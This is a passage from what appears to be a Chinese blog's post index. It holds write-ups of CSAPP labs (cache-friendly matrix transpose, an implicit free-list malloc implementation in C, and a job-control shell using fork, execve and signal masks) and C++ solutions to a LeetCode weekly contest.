即可对所有注册的矩阵转置函数进行测试。\nvoid registerFunctions()&#123;    /* Register your solution function */    registerTransFunction(transpose_submit, transpose_submit_desc);     /* Register any additional transpose functions */    registerTransFunction(trans, trans_desc);    // Blocked    registerTransFunction(blocked4_4_trans, blocked4_4_trans_desc);    registerTransFunction(blocked5_5_trans, blocked5_5_trans_desc);    ...    registerTransFunction(blocked20_20_trans, blocked20_20_trans_desc);&#125;\n经过暴力枚举，发现在 $32×32$、$64×64$、$61×67$ 下的最优矩阵分块大小分别为 8、4、17，在 transpose-submit 函数中根据 M、N 的值分别调用适合的转置函数，得分如下：\n\n循环展开在上面的分块转置模板中，矩阵 $A$ 和 $B$ 是交替进行访问的，这可能导致矩阵 $A$ 访问的块马上又在访问矩阵 $B$ 时被置换，因此可以将最内层循环进行展开，对于分块大小为 $bsize$ 的转置方法，先连续访问完 $A$ 的一个 $1×bsize$ 的切片，将其暂存入变量中，再连续访问 $B$ 的 $bsize×1$ 切片。\n将 $32×32$ 和 $64×64$ （$61×67$ 的测试样例已得满分，没有选择进一步优化）的对应的分块转置方法的内层循环展开后，得分如下：\n\n这样，$32×32$ 也得到了满分，但是 $64×64$ 分数仍然比较低，看来简单的分块方法还不够，可能需要针对 Cache 的参数将矩阵元素访问顺序进行重排，这部分我暂时没有完成，之后有时间可以再尝试一下。\n","categories":["计算机基础"],"tags":["经验","计算机基础","矩阵","C","数据结构与算法"]},{"title":"CSAPP Malloc Lab","url":"/2025/01/10/CSAPP-Malloc-Lab/","content":"本 Lab 需要实现一个内存分配器，技巧性较强，对应知识点为书中的第 9 章的第 9.9 节。个人认为是所有 Lab 中难度最高的一个，我这里也是时间所迫，只参照教材实现了隐式空闲链表，显式空闲链表的实现尚存在一些 bug，在本文暂不介绍。\n\n思路实验要求实现 mm_init, mm_malloc, mm_free, mm_realloc。\nmm_malloc 需要返回 8 字节对齐的指针。\nmm_realloc: 返回一个指向至少 size 字节的内存区域指针。\n\n如果 ptr 为空，作用等同于 mm_malloc(size)。\n如果 size 等于 0，作用等用于 mm_free(ptr)。\n如果 ptr 非空，将 ptr 指向区域的大小更改为 size 字节，并返回新区域的内存地址。\n\n隐式空闲链表首先介绍一下书中介绍的隐式空闲链表的设计，主要分为两个方面：空闲块的设计和空闲链表的组织。\n空闲块的设计\n一个空闲块由三部分组成：首部、载荷（可能包含填充）和尾部。头部和尾部的内容完全一致，之所以要引入这样的冗余信息，是为了实现常数时间复杂度的反向访问。因为内存载荷大小的不确定性，因此无法直接根据当前内存载荷的地址计算得到前一块的地址，而引入了尾部后，就能够根据固定步长（当前块的首部和上一块的尾部地址差一个字）计算得到前一块载荷的地址。\n另外，首（尾）部的内容也值得一提，由于空闲块需要 8 字节对齐，因此 block size 的低 3 位必定为 0，因此这 3 位的信息是冗余的，可省略，转而将其最低位作为分配位，0 代表空闲，1 代表已分配。\n空闲链表的组织\n空闲链表的组织如上图所示，可以看到，常规的内存块两端引入了序言块（prologue block）和结尾块（epilogue block），同时为了保持 8 字节对齐，还在序言块的头部引入了一个 4 字节的 padding 块。\n序言块和结尾块的分配位都标记为 1，之所以要这么做，是为了更方便地处理空闲块合并时的边界条件，它们的作用其实就相当于链表的 dummy 结点。其中，结尾块的大小字段设置为 0，用以唯一地对其进行标记（因为其他块的大小必定大于 0）。\n各函数实现由于 mm_init，mm_malloc 等操作书中已经实现且比较易懂，接下来主要介绍 extend_heap，find_fit，place 和 mm_realloc。\nextend_heapextend_heap 的作用是对堆进行扩展，具体来说是先使用 mm_sbrk 向上增长堆尾指针 mm_brk 的位置，再将新扩展出来的内存块连接到原有块的末尾。\n连接这部分的操作不太易懂，书中也对此做出了解释：\n\nThe remainder of the extendheap function (lines 12–17) is somewhat subtle. The heap begins on a double-word aligned boundary, and every call to extend heap returns a block whose size is an integral number of double words. Thus, every call to mem_sbrk returns a double-word aligned chunk of memory immediately following the header of the epilogue block. This header becomes the header of the new free block (line 12), and the last word of the chunk becomes the new epilogue block header (line 14). Finally, in the likely case that the previous heap was terminated by a free block, we call the coalesce function to merge the two free blocks and return the block pointer of the merged blocks (line 17).\n\n简单来说，新扩展出来的块的起始地址即 mm_sbrk(size) 的返回值 bp，它紧挨在原来块的末尾——结尾块的头部，而 PUT(HDRP(bp), PACK(size, 0)) 则正好是将其覆盖并作为新块的头部，注意 HDRP 的定义：#define HDRP(bp) ((char *)(bp) - WSIZE)。随后便是创建尾部，并在新块的末尾添加一个新的结尾块，最后尝试将新块与前一块进行合并。\nstatic void *extend_heap(size_t words)&#123;    char *bp;    size_t size;    // 分配偶数个字来保持字节对齐     size = (words % 2) ? (words + 1) * WSIZE : words * WSIZE;    if ((long)(bp = mem_sbrk(size)) == -1) &#123;        return NULL;    &#125;    // 初始化空闲块的 header, footer 和下一块的 epilogue    PUT(HDRP(bp), PACK(size, 0));    PUT(FTRP(bp), PACK(size, 0));    PUT(HDRP(NEXT_BLKP(bp)), PACK(0, 1));    // 如果前一块是空闲，则合并    return coalesce(bp);&#125;\nfind_fit这部分其实没什么好说的，我只是实现了最简单的首次匹配算法，需要注意的就是根据 size 是否等于 0 来判断当前遍历块是否是结尾块。\nstatic void *find_fit(size_t asize)&#123;    size_t size;    // 最简单的首次匹配策略    for (void *blkp = heap_listp;        (size = GET_SIZE(HDRP(blkp))) != 0;        blkp = NEXT_BLKP(blkp)) &#123;        if (size &gt;= asize &amp;&amp; !GET_ALLOC(HDRP(blkp))) &#123;            return blkp;        &#125;    &#125;    return NULL;&#125;\nplaceplace 操作通常紧跟在成功查找到空闲块之后执行，作用是将 asize 大小的块”放置在“地址为 bp 的块中。一种最简单朴素的做法当然是将整个块进行完全分配，但是这样会引入大量的内部碎片（internal fragmentation），降低内存的利用率。\n为了改善这一点，需要对块进行分割，书中提到的一种简单的分割策略是：如果分割后剩余的块大小大于等于隐式空闲链表空闲块设计的最小大小（即 8 字节，只包含首部和尾部），则进行分割，否则，整个分配。在代码实现上，分割时只需要分配放置分配块与剩余块的首部和尾部即可。\nstatic void place(void *bp, size_t asize)&#123;    size_t size = GET_SIZE(HDRP(bp));  // 空闲块大小    size_t remain = size - asize;      // 空闲块分配 asize 字节后剩余的空间    if (remain &gt;= DSIZE) &#123;  // 分割        PUT(HDRP(bp), PACK(asize, 1));        PUT(FTRP(bp), PACK(asize, 1));        bp = NEXT_BLKP(bp);        PUT(HDRP(bp), PACK(remain, 0));        PUT(FTRP(bp), PACK(remain, 0));    &#125; else &#123;                // 不分割        PUT(HDRP(bp), PACK(size, 1));        PUT(FTRP(bp), PACK(size, 1));    &#125;&#125;\nmm_reallocmm_realloc 作用是调整地址为 ptr 的块大小，另外当 ptr 为空或 size 为 0 时有特殊作用，这部分比较简单，下面只讨论普遍的情况：\n虽说是用户调整块大小，但块大小仍然要保持 8 字节对齐，因此首要工作是计算实际调整后的块大小 asize 的值。随后根据 asize 与原始块的大小 osize 进行比较，根据三种不同情况分别进行处理：\n\nosize == asize：此时不变，返回 ptr 即可。\nosize &gt; asize：块进行收缩，需要将其进行分割，回想前面实现的 place 作用正好就是分割块，因此直接调用后返回 ptr 即可。\nosize &lt; asize：块进行扩张，有三种解决方式：\n首先可以尝试合并相邻块，但由于要保证块调整后数据的完整性，因此合并前一块的操作略显麻烦，需要将数据整个进行移动，且同时也会引入额外的时间开销。这里为了实现的简单，只考虑对后一块进行合并，这样就只需要调整首尾块大小，而不需要对内存载荷做任何修改。\n若无可合并的块或合并后块大小仍然不足，则遍历整个空闲链表，找到块大小大于等于 asize 的块，使用 place 对其进行分割，并使用 memcpy 将原始块的数据拷贝至新块中。最后，极其关键 的一点，需要将原始块进行释放，否则将会出现内存耗尽的错误，我就忽视了这一点，debug 了很长时间…\n若空闲链表中找不到满足条件的块，则使用 extend_heap 对堆进行扩展，后续的操作与 (2) 相同。\n\n\n\nvoid *mm_realloc(void *ptr, size_t size)&#123;    size_t osize, asize;    size_t extendsize;    char *bp;    if (ptr == NULL) &#123;        return mm_malloc(size);    &#125; else if (size == 0) &#123;        mm_free(ptr);        return NULL;    &#125;    // 调整块大小以对齐    if (size &lt; DSIZE) &#123;        asize = 2 * DSIZE;    &#125; else &#123;        asize = DSIZE * ((size + (DSIZE) + (DSIZE - 1)) / DSIZE);    &#125;    osize = GET_SIZE(HDRP(ptr));    if (osize == asize) &#123;        // 不变        bp = ptr;    &#125; else if (osize &gt; asize) &#123;  // 收缩，进行分割        place(ptr, asize);        bp = ptr;    &#125; else &#123;                     // 扩张，首先尝试合并相邻块，若相邻块已分配或合并后仍然不够，                                 // 则尝试查找新块，若找不到，则进行堆空间的申请        // 合并相邻块（简化版：只合并后续块）        if (!GET_ALLOC(HDRP(NEXT_BLKP(ptr)))) &#123;            osize += GET_SIZE(HDRP(NEXT_BLKP(ptr)));            PUT(HDRP(ptr), PACK(osize, 1));            PUT(FTRP(ptr), PACK(osize, 1));        &#125;        if (osize &gt;= asize) &#123;                         // 合并后足够分配            place(ptr, asize);            bp = ptr;        &#125; else if ((bp = find_fit(asize)) != NULL) &#123;  // 合并后仍然不够，查找新块            place(bp, asize);            memcpy(bp, ptr, MIN(osize, asize));            mm_free(ptr);        &#125; else &#123;                                      // 未匹配任何块，申请更多内存            extendsize = MAX(asize, CHUNKSIZE);            if ((bp = extend_heap(extendsize / WSIZE)) != NULL) &#123;                place(bp, asize);                memcpy(bp, ptr, MIN(osize, asize));            &#125;            mm_free(ptr);        &#125;    &#125;    return bp;&#125;\n测试结果最终经过测试，隐式空闲链表的得分如下所示。其中内存利用率得分为 46 分（满分 60 分），意外的还不错。性能得分起伏较大，分数在 20~35 分（满分 40 分）不等，这部分感觉比较玄学。\n\n小技巧：如何切换不同的mm.c实现本 Lab 可能需要写多个不同版本的 mm.c，进行效率得分的比对，如何在不同的 mm.c 实现中切换值得一说。\n起初我的设想是使用宏控制不同 mm.c 源文件的预处理，并将它们（例如 mm-imp.c、mm-ex.c）都写入 Makefile 中同时编译，但这样又得分别编写各自的编译行为，比较麻烦。\n最后想到将 mm-imp.c 和 mm-ex.c 视作文本文件，不进行编译，而是供实际编译的 mm.c 借助预处理器选择性导入：\n/* mm.c */#if 0    #include &quot;mm-imp.c&quot;  // 启用隐式空闲链表#else    #include &quot;mm-ex.c&quot;   // 启用显式空闲链表#endif\n这样在每次在显式和隐式实现中切换时就只需要更改 #if 后的 0 和 1 了。\n代码/* single word (4) or double word (8) alignment */#define ALIGNMENT 8/* rounds up to the nearest multiple of ALIGNMENT */#define ALIGN(size) (((size) + (ALIGNMENT - 1)) &amp; ~0x7)#define SIZE_T_SIZE (ALIGN(sizeof(size_t)))/* Basic constants and macros */#define WSIZE 4#define DSIZE 8#define CHUNKSIZE (1 &lt;&lt; 12)#define MAX(x, y) ((x) &gt; (y) ? (x) : (y))#define MIN(x, y) ((x) &lt; (y) ? (x) : (y))/* Pack and write a word at address p */#define PACK(size, alloc) ((size) | (alloc))/* Read and write a word at address p */#define GET(p) (*(unsigned int *)(p))#define PUT(p, val) (*(unsigned int *)(p) = (val))/* Read the size and allocated fields from address p */#define GET_SIZE(p) (GET(p) &amp; ~0x7)#define GET_ALLOC(p) (GET(p) &amp; 0x1)/* Given block ptr bp, compute address of its header and footer */#define HDRP(bp) ((char *)(bp) - WSIZE)#define FTRP(bp) ((char *)(bp) + GET_SIZE(HDRP(bp)) - DSIZE)/* Given block ptr bp, compute address of next and previous blocks */#define NEXT_BLKP(bp) ((char *)(bp) + GET_SIZE(((char *)(bp) - WSIZE)))#define PREV_BLKP(bp) ((char *)(bp) - GET_SIZE(((char *)(bp) - DSIZE)))static void *heap_listp;  // 堆链表static void *extend_heap(size_t words);static void *coalesce(void *bp);static void *find_fit(size_t asize);static void place(void *bp, size_t asize);int mm_init(void)&#123;    // 创建初始堆链表    if ((heap_listp = mem_sbrk(4 * WSIZE)) == (void *)-1) &#123;        return -1;    &#125;    PUT(heap_listp, 0);    PUT(heap_listp + (1 * WSIZE), PACK(DSIZE, 1));  // prologue header    PUT(heap_listp + (2 * WSIZE), PACK(DSIZE, 1));  // prologue footer    PUT(heap_listp + (3 * WSIZE), PACK(0, 1));      // epilogue header    heap_listp += (2 * WSIZE);    // 使用 CHUNKSIZE 字节大小的块扩展堆链表    if (extend_heap(CHUNKSIZE / WSIZE) == NULL) &#123;        return -1;    &#125;    return 0;&#125;void *mm_malloc(size_t size)&#123;    size_t asize;    size_t extendsize;    char *bp;    if (size == 0) &#123;        return NULL;    &#125;    // 调整块大小以对齐    if (size &lt; DSIZE) &#123;        asize = 2 * DSIZE;    &#125; else &#123;        asize = DSIZE * ((size + (DSIZE) + (DSIZE - 1)) / DSIZE);    &#125;    // 搜索堆链表进行匹配    if ((bp = find_fit(asize)) != NULL) &#123;        place(bp, asize);        return bp;    &#125;    // 未匹配任何块，申请更多内存    extendsize = MAX(asize, CHUNKSIZE);    if ((bp = extend_heap(extendsize / WSIZE)) == NULL) &#123;        return NULL;    &#125;    place(bp, asize);    return bp;&#125;void mm_free(void *ptr)&#123;    size_t size = GET_SIZE(HDRP(ptr));    PUT(HDRP(ptr), PACK(size, 0));    PUT(FTRP(ptr), PACK(size, 0));    coalesce(ptr);&#125;void *mm_realloc(void *ptr, size_t size)&#123;    size_t osize, asize;    size_t extendsize;    char *bp;    if (ptr == NULL) &#123;        return mm_malloc(size);    &#125; else if (size == 0) &#123;        mm_free(ptr);        return NULL;    &#125;    // 调整块大小以对齐    if (size &lt; DSIZE) &#123;        asize = 2 * DSIZE;    &#125; else &#123;        asize = DSIZE * ((size + (DSIZE) + (DSIZE - 1)) / DSIZE);    &#125;    osize = GET_SIZE(HDRP(ptr));    if (osize == asize) &#123;        // 不变        bp = ptr;    &#125; else if (osize &gt; asize) &#123;  // 收缩，进行分割        place(ptr, asize);        bp = ptr;    &#125; else &#123;                     // 扩张，首先尝试合并相邻块，若相邻块已分配或合并后仍然不够，                                 // 则尝试查找新块，若找不到，则进行堆空间的申请        // 合并相邻块（简化版：只合并后续块）        if (!GET_ALLOC(HDRP(NEXT_BLKP(ptr)))) &#123;            osize += GET_SIZE(HDRP(NEXT_BLKP(ptr)));            PUT(HDRP(ptr), PACK(osize, 1));            PUT(FTRP(ptr), PACK(osize, 1));        &#125;        if (osize &gt;= asize) &#123;                         // 合并后足够分配            place(ptr, asize);            bp = ptr;        &#125; else if ((bp = find_fit(asize)) != NULL) &#123;  // 合并后仍然不够，查找新块            place(bp, asize);            memcpy(bp, ptr, MIN(osize, asize));            mm_free(ptr);        &#125; else &#123;                                      // 未匹配任何块，申请更多内存            extendsize = MAX(asize, CHUNKSIZE);            if ((bp = extend_heap(extendsize / WSIZE)) != NULL) &#123;                place(bp, asize);                memcpy(bp, ptr, MIN(osize, asize));            &#125;            mm_free(ptr);        &#125;    &#125;    return bp;&#125;static void *extend_heap(size_t words)&#123;    char *bp;    size_t size;    // 分配偶数个字来保持字节对齐     size = (words % 2) ? (words + 1) * WSIZE : words * WSIZE;    if ((long)(bp = mem_sbrk(size)) == -1) &#123;        return NULL;    &#125;    // 初始化空闲块的 header, footer 和下一块的 epilogue    PUT(HDRP(bp), PACK(size, 0));    PUT(FTRP(bp), PACK(size, 0));    PUT(HDRP(NEXT_BLKP(bp)), PACK(0, 1));    // 如果前一块是空闲，则合并    return coalesce(bp);&#125;static void *coalesce(void *bp)&#123;    size_t prev_alloc = GET_ALLOC(FTRP(PREV_BLKP(bp)));    size_t next_alloc = GET_ALLOC(HDRP(NEXT_BLKP(bp)));    size_t size = GET_SIZE(HDRP(bp));    if (prev_alloc &amp;&amp; next_alloc) &#123;          // 前后都已分配        return bp;    &#125; else if (prev_alloc &amp;&amp; !next_alloc) &#123;  // 后一块未分配        size += GET_SIZE(HDRP(NEXT_BLKP(bp)));        PUT(HDRP(bp), PACK(size, 0));        PUT(FTRP(bp), PACK(size, 0));    &#125; else if (!prev_alloc &amp;&amp; next_alloc) &#123;  // 前一块未分配        size += GET_SIZE(HDRP(PREV_BLKP(bp)));        PUT(FTRP(bp), PACK(size, 0));        PUT(HDRP(PREV_BLKP(bp)), PACK(size, 0));        bp = PREV_BLKP(bp);    &#125; else &#123;                                 // 前后都未分配         size += GET_SIZE(HDRP(PREV_BLKP(bp))) + GET_SIZE(FTRP(NEXT_BLKP(bp)));        PUT(HDRP(PREV_BLKP(bp)), PACK(size, 0));        PUT(FTRP(NEXT_BLKP(bp)), PACK(size, 0));        bp = PREV_BLKP(bp);    &#125;    return bp;&#125;static void *find_fit(size_t asize)&#123;    size_t size;    // 最简单的首次匹配策略    for (void *blkp = heap_listp;        (size = GET_SIZE(HDRP(blkp))) != 0;        blkp = NEXT_BLKP(blkp)) &#123;        if (size &gt;= asize &amp;&amp; !GET_ALLOC(HDRP(blkp))) &#123;            return blkp;        &#125;    &#125;    return NULL;&#125;static void place(void *bp, size_t asize)&#123;    size_t size = GET_SIZE(HDRP(bp));  // 空闲块大小    size_t remain = size - asize;      // 空闲块分配 asize 字节后剩余的空间    if (remain &gt;= DSIZE) &#123;  // 分割        PUT(HDRP(bp), PACK(asize, 1));        PUT(FTRP(bp), PACK(asize, 1));        bp = NEXT_BLKP(bp);        PUT(HDRP(bp), PACK(remain, 0));        PUT(FTRP(bp), PACK(remain, 0));    &#125; else &#123;                // 不分割        PUT(HDRP(bp), PACK(size, 1));        PUT(FTRP(bp), PACK(size, 1));    &#125;&#125;\n","categories":["计算机基础"],"tags":["经验","计算机基础","C"]},{"title":"LeetCode周赛总结 第276场","url":"/2022/01/16/LeetCode%E5%91%A8%E8%B5%9B%E6%80%BB%E7%BB%93%20%E7%AC%AC276%E5%9C%BA/","content":"本次周赛相对比较简单，前三题花的时间比较短，但无奈最后一题还是没思路。。。\n将字符串拆分成若干长度为 k 的组题目链接将字符串拆分成若干长度为 k 的组\n解题思路遍历字符串 s 的每个字符并加入到一个临时字符串中，当此临时字符串长度为 k 时，加入到结果数组中并清空此字符串。若此时遍历到字符串的最后一个字符且此时临时字符串长度没有达到 k 时，则向其末尾填入字符 fill 直到临时字符串长度达到 k，再加入到结果数组中。\n解题代码class Solution &#123;public:    vector&lt;string&gt; divideString(string s, int k, char fill) &#123;        vector&lt;string&gt; res;        string newStr;        for (int i = 0; i &lt; s.size(); i++) &#123;            newStr += s[i];            if (newStr.size() == k) &#123;                res.emplace_back(newStr);                newStr.clear();            &#125;            else if (i == s.size() - 1) &#123;                for (int j = newStr.size(); j &lt; k; j++) &#123;                    newStr += fill;                &#125;                res.emplace_back(newStr);            &#125;        &#125;        return res;    &#125;&#125;;\n得到目标值的最少行动次数题目链接得到目标值的最少行动次数\n解题思路要想行动的次数最少，必然要在数尽可能大的情况下使用加倍，但这种思路不好正向模拟，因此考虑模拟该运算的逆过程。\n从 target 值开始\n\n若该数为奇数，则减 1 之后再除以 2，加倍次数 maxDoubles 减 1，行动次数加 2.\n若该数为偶数，则除以 2，加倍次数 maxDoubles 减 1，行动次数加 1.\n\n当加倍次数使用完毕，即 maxDoubles 值为 0 时，后面行动全为减 1，因此行动次数直接加上此时的 target - 1.\n解题代码class Solution &#123;public:    int minMoves(int target, int maxDoubles) &#123;        int res = 0;        while (target &gt; 1) &#123;            if (maxDoubles &gt; 0) &#123;                if (target % 2) &#123;                    target--;                    target /= 2;                    maxDoubles--;                    res += 2;                &#125;                else &#123;                    target /= 2;                    maxDoubles--;                    res++;                &#125;            &#125;            else &#123;                res += target - 1;                target = 1;            &#125;        &#125;        return res;    &#125;&#125;;\n解决智力问题题目链接解决智力问题\n解题思路一个典型的动态规划问题，可将整个问题分解成一系列等价的子问题。首先确定最后一个问题单独出现时的最优解，然后逐个在该问题之前添加问题，该问题可以选择解或者不解：\n\n若解，则此时结果为 questions[i][0] + dp[i + questions[i][1] + 1]（dp[i] 为子问题 i ~ n 的解）。\n若不解，则此时结果与不加入此问题时相同，为 dp[i + 1]。\n\n分别计算两种情况下的值，取更大的作为最优解。需要注意的是，dp[i + questions[i][1] + 1] 可能会导致数组越界，因此需要先进行判断。\n按此方法依次迭代，最终得到原问题的最优解。\n解题代码class Solution &#123;public:    long long mostPoints(vector&lt;vector&lt;int&gt;&gt;&amp; questions) &#123;        vector&lt;long long&gt; dp(questions.size());        dp.back() = questions.back().front();        for (int i = questions.size() - 2; i &gt;= 0; i--) &#123;            if (questions[i][1] + i + 1 &lt; dp.size())                dp[i] = max(questions[i][0] + dp[i + questions[i][1] + 1], dp[i + 1]);            else                dp[i] = max(static_cast&lt;long long&gt;(questions[i][0]), dp[i + 1]);        &#125;        return dp[0];    &#125;&#125;;\n同时运行 N 台电脑的最长时间题目链接同时运行 N 台电脑的最长时间\n解题思路直接根据条件求解答案比较困难，因此考虑使用二分答案法，在所以可能的结果之间进行二分查找，每次查找完后验证是否符合条件。若符合，则 l = mid + 1；若不符合，r = mid. 最终找到第一个不符合条件的结果，它减一也就是符合条件的最大结果。\n那么问题的关键在于如何确定某个数 t 是否符合条件。假设该数为 t，即所有电脑需要同时运行 t 分钟，因为一个电池只能同时给一台电脑供电，因此一个电池可供电的最长时间将会受到 t 的限制，因此一个电池的可供电的最长时间为 min(t, batteries[i])。根据这个条件，我们可以求出所有电池可供电的最长时间的总和 S，最后判断 S 是否大于等于 n * t 来得到该值是否符合条件。\n为什么可以直接根据 S 和 n * t 的大小关系进行判断呢？我们可以将 N 台电脑的供电过程想象成一个串行的过程，先使用若干电池给第一台电脑供电，然后继续使用其它电池给第二台电脑供电，以此类推。事实上，各电脑的供电过程是并行的，而我们刚刚的电池分配方案间并不会冲突，因此是可行的。 \n解题代码class Solution &#123;public:    long long maxRunTime(int n, vector&lt;int&gt;&amp; batteries) &#123;        auto canRun = [&amp;](long long t) &#123;            long long sum = 0;            for (const auto&amp; battery : batteries) &#123;                sum += min(static_cast&lt;long long&gt;(battery), t);            &#125;            return sum / t &gt;= n;        &#125;;        long long sumBat = accumulate(batteries.begin(), batteries.end(), 0L);        long long l = 1, r = sumBat / n + 1;        while (l &lt; r) &#123;            long long mid = (l + r) / 2;            if (canRun(mid))                l = mid + 1;            else                r = mid;        &#125;        return l - 1;    &#125;&#125;;\n","categories":["数据结构与算法"],"tags":["C++","算法","数据结构"]},{"title":"CSAPP Shell Lab","url":"/2024/12/29/CSAPP-Shell-Lab/","content":"本 Lab 需要实现一个简易的 shell，主要考察对进程和信号的理解，以及对与其相关的 POSIX API 的使用，对应知识点为书中的第 8 章内容。\n\n思路实验要求实现一个简单的 shell，要求支持如下特性：\n\n输入 ctrl-c 触发 SIGINT 信号，输入 ctrl-z 触发 SIGTSTP 信号，发送给给前台运行的任务和依赖于这些任务的子任务（子进程）。\n如果命令行以 &amp; 结尾，那么本次作业将被置于后台运行，否则置于前台运行。\n每个作业可以通过 PID（process id）或 JID（job id）来指定，其中 JID 需要加上前缀 %。\n支持下列内建命令：\nquit：终止 shell 的运行。\njobs：列出所有的后台作业。\nbg &lt;job&gt;：重启 &lt;job&gt;（PID 或者 JID），通过发出 SIGCONT 信号，然后将其运行在后台。\nfg &lt;job&gt;：重启 &lt;job&gt;（PID 或者 JID），通过发出 SIGCONT 信号，然后将其运行在前台。\n\n\n回收所有的僵尸进程。\n\n命令行解释执行eval 函数的作用是解析并执行 shell 输入的命令行。对于内建命令（builtin command）而言，应该立即在 shell 中进行处理；而对于非内建命令而言，应该使用 fork + execve 的组合，创建一个指定的进程来进行处理。\n\ntsh 不需要支持管道功能，因此一个作业只对应一个进程。\n\nfork 的功能是创建一个子进程，该子进程的虚拟地址空间完全拷贝自其父进程，且程序计数器的位置同样位于该 fork 函数处。区别在于，父进程的返回值为子进程的 pid，子进程的 pid 为 0，因此可以根据这一特性来对父进程和子进程进行分别处理：\n\n子进程需要先使用 setpgid(0, 0) 将进程组 id 设置为自己的 pid，将自己与 tsh “脱离”，确保此时前台进程组只有 tsh 本身，防止被 tsh 接收到的信号所影响。然后再使用 execve，用指定的可执行程序替换拷贝自父进程的虚拟地址空间，并开始从头执行。\n父进程则需要根据本次输入的命令行，创建其对应的作业数据结构 struct job_t，并加入作业队列 jobs 中。同时，由于前台作业（命令行末尾不带 &amp; 符号）需要一直占用终端，因此当本次作业为前台作业时，需要调用 waitfg 进行等待，直到作业的类型不再是前台运行（FG）。\n\nif ((pid = fork()) == 0) &#123;    setpgid(0, 0);  // 将进程组设置为自己的 pid    if (execve(argv[0], argv, environ) &lt; 0) &#123;        printf(&quot;execve %s error\\n&quot;, argv[0]);        exit(1);    &#125;&#125; else &#123;    if (bg) &#123;        addjob(jobs, pid, BG, cmdline);        printf(&quot;[%d] (%d) %s&quot;, getjobpid(jobs, pid)-&gt;jid, pid, cmdline);    &#125; else &#123;        addjob(jobs, pid, FG, cmdline);        waitfg(pid);    &#125;&#125;\n根据书中 8.5.6 节的描述，可能会出现一种情况：父进程 fork 子进程后，子进程一直被调度执行，直到运行结束称为一个僵尸进程（zombie）并向父进程发送 SIGCHLD 信号。等到父进程被调度时，他先响应 SIGCHLD 信号并将成为僵尸进程的子进程收割（reap），同时尝试将作业从作业队列中移除，此时事实上不会做任何事情，因为作业还没有加入到作业队列中。再接下来父进程继续执行 fork 后的代码，才将作业加入到作业队列中，这明显不对！\n针对这类恼人的同步问题，可以采用 sigprocmask （如下所示是 sigprocmask 的使用说明）在适当的位置设置信号屏蔽字来解决。对于本问题，可以在父进程中先屏蔽对 SIGCHLD 信号的处理，等到使用 addjob 将作业加入作业队列后才开始响应 SIGCHLD 信号，这样即便是子进程先执行完毕并向父进程发送 SIGCHLD 信号，父进程也能确保在 addjob 执行完后才处理这一信号。\n\n\ngenerated by GPT4o\n\nsigprocmask 介绍sigprocmask 是一个用于操作信号屏蔽字（signal mask）的系统调用。它允许程序暂时屏蔽或取消屏蔽某些信号的接收，进而控制信号的处理行为。通过它，程序可以避免在特定代码段中处理中断信号，从而进行更细粒度的控制。\nsigprocmask 的原型：#include &lt;signal.h&gt;int sigprocmask(int how, const sigset_t *set, sigset_t *oldset);\n\nhow：\nSIG_BLOCK：将 set 中的信号加入到当前信号屏蔽字中（即阻塞这些信号）。\nSIG_UNBLOCK：从当前信号屏蔽字中移除 set 中的信号（即解除屏蔽这些信号）。\nSIG_SETMASK：将当前信号屏蔽字设置为 set 中的信号集（即完全替换当前的信号屏蔽字）。\n\n\nset：指向包含信号集的 sigset_t 类型变量，该变量指定要阻塞或解除阻塞的信号。\noldset：指向 sigset_t 类型的变量，用来保存当前的信号屏蔽字，以便稍后恢复。\n\n信号集 sigset_t 的操作：\n初始化信号集：\nsigemptyset(sigset_t *set)：清空信号集。\nsigfillset(sigset_t *set)：将所有信号加入信号集。\nsigaddset(sigset_t *set, int signum)：将特定信号加入信号集。\nsigdelset(sigset_t *set, int signum)：从信号集中移除特定信号。\n\n\n\n\n此外，为了防止其他可能的并发错误出现，可以在对全局变量的修改前先屏蔽所有信号。\nsigset_t mask_all, mask_one, prev_one;sigfillset(&amp;mask_all);sigemptyset(&amp;mask_one);sigaddset(&amp;mask_one, SIGCHLD);sigprocmask(SIG_BLOCK, &amp;mask_one, &amp;prev_one);if ((pid = fork()) == 0) &#123;    sigprocmask(SIG_SETMASK, &amp;prev_one, NULL);    setpgid(0, 0);  // 将进程组设置为自己的 pid    if (execve(argv[0], argv, environ) &lt; 0) &#123;        printf(&quot;execve %s error\\n&quot;, argv[0]);        exit(1);    &#125;&#125; else &#123;    sigprocmask(SIG_BLOCK, &amp;mask_all, NULL);    if (bg) &#123;        addjob(jobs, pid, BG, cmdline);        sigprocmask(SIG_SETMASK, &amp;prev_one, NULL);        printf(&quot;[%d] (%d) %s&quot;, getjobpid(jobs, pid)-&gt;jid, pid, cmdline);    &#125; else &#123;        addjob(jobs, pid, FG, cmdline);        sigprocmask(SIG_SETMASK, &amp;prev_one, NULL);        waitfg(pid);    &#125;&#125;\nbg/fg: 已停止作业恢复执行在内建命令中，quit 直接让程序正常退出即可，jobs 只需调用已实现的函数 listjobs，真正需要实现的是 bg 和 fg，它们的作用是将处于停止状态的作业恢复到后台（前台）执行。\n实现方式无非分两步：\n\n参数解析，提取出作业 ID（分为 PID 和 JID）。\n根据 bg 和 fg 的不同，分别进行处理，将作业运行在前台或是后台。\n\n参数解析其实也就是字符串处理，这部分与本章的异常控制流关系不大，在此不过多赘述。\n根据参数得到对应的作业 job 后，首先需要它的运行状态更改为指定的状态（BG 或 FG），然后向 job 对应的进程组（kill 的 pid 参数为 -job-&gt;pid）发送 SIGCONT 信号，将内核在响应此信号后会重新调度该进程组内的所有进程执行。\nsigprocmask(SIG_BLOCK, &amp;mask_all, &amp;prev_one);job-&gt;state = state;sigprocmask(SIG_SETMASK, &amp;prev_one, NULL);kill(-job-&gt;pid, SIGCONT);\n最后，对于前台运行而言，父进程需要调用 waitfg 进行等待；对于后台运行而言，打印作业信息（具体格式见 tshref.out 的内容）。\nif (state == FG) &#123;    waitfg(job-&gt;pid);&#125; else &#123;    printf(&quot;[%d] (%d)&quot;, job-&gt;jid, job-&gt;pid);    for (int i = 0; argv[i] != NULL; ++i) &#123;        printf(&quot; %s&quot;, argv[i]);    &#125;    printf(&quot;\\n&quot;);&#125;\n信号处理函数这部分看似简单，实则很容易出错，值得仔细说说。\n最开始，我在 sigint_handler 和 sigtstp_handler 中进行了对作业队列的操作，在 sigint_handler 中使用 deletejob 删除作业，在 sigtstp_handler 中将作业状态修改为 ST。\n这在前面的测试用例中工作一切正常，但在最后的 trace16 中，程序却阻塞在了 mystop.c 的 if (kill(-pid, SIGTSTP) &lt; 0) 位置，而如果按下键盘的 ctrl-c 或 ctrl-z 却能够响应信号，程序也正常终止或暂停。\n通过查阅网上资料，在 实验四：Shell-Lab（下） - 知乎 找到了问题的原因。\n程序 mystop 使用 kill 发送信号时，信号是直接发送到内核进行处理的，而不会经过 shell，shell 